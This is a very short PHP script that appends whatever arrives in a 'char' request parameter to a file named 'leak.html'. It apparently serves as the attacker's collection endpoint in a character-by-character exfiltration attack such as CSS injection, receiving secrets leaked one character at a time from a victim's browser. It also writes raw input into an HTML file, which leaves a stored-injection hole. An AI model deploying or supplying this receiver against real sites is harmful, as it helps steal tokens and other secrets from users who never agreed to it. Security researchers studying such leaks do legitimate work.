<?php
    if(isset($_GET['char'])) {
        $file = 'leak.html';
        file_put_contents($file, $_GET['char'], FILE_APPEND);
    }
?>